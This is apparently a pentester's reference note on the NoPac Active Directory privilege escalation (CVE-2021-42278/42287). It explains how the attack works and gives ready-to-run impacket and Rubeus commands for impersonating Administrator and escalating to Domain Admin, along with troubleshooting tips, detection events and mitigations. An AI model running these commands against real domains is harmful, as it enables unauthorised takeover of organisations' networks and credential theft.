---
tags: [pentest, nopac, cve-2021-42278, cve-2021-42287, ad, active-directory, initial-access, windows]
phase: 5
---
# NoPac (CVE-2021-42278 + CVE-2021-42287)

Combine sAMAccountName spoofing with PAC validation bypass. **Any domain user → Domain Admin** if `ms-DS-MachineAccountQuota > 0`.

[[06 - Gaining Access/00 - README|Folder index]]

## Affected

- Windows DCs without Nov 2021 / KB5008380+ patches.
- Requires `ms-DS-MachineAccountQuota` ≥ 1 (default: 10).

## How it works

1. Create a machine account named `DC01` (without the trailing `$`) - allowed because `ms-DS-MachineAccountQuota`.
2. Request a TGT for the new computer.
3. Rename the new computer account to something else.
4. Request a service ticket using S4U2self - KDC issues a ticket for `DC01$` (now a real DC) instead of your renamed account.
5. PAC validation flaw → you get a TGS for `DC01` as Administrator.
6. PtT → DCSync.

## Exploit

```bash
# All-in-one
impacket-noPac.py -dc-ip <dc-ip> -dc-host <dc-fqdn> 'corp.local/user:pass' -shell

# Manual steps with separate tools
impacket-addcomputer -computer-name 'evil$' -computer-pass 'P@ss123' 'corp.local/user:pass'
# Then exploit (custom or noPac script)
```

```cmd
:: Windows
Rubeus.exe asktgt /user:DC01$ /password:P@ss /domain:corp.local /dc:dc01.corp.local
Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/dc01.corp.local /user:DC01$ /rc4:... /ptt
```

## Verify exploitable

```bash
# Check MachineAccountQuota
nxc ldap <dc-ip> -u user -p pass -M maq

# Patches:
# CVE-2021-42278 - Nov 2021 cumulative
# CVE-2021-42287 - same
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `STATUS_USER_EXISTS` when adding computer | Pick different name; or hit MachineAccountQuota limit (try a different user). |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | DC patched against PAC manipulation. NoPac dead here. |
| `MachineAccountQuota=0` | Cannot create computer accounts. Need a different path. |

## Detection

- Event ID **4741** (computer account created) for non-admin user.
- Computer account name matching an existing DC's hostname.
- Audit "Audit Computer Account Management".

## Mitigation

- Set `ms-DS-MachineAccountQuota = 0` (or restrict who can create computer accounts).
- Apply November 2021 patches.
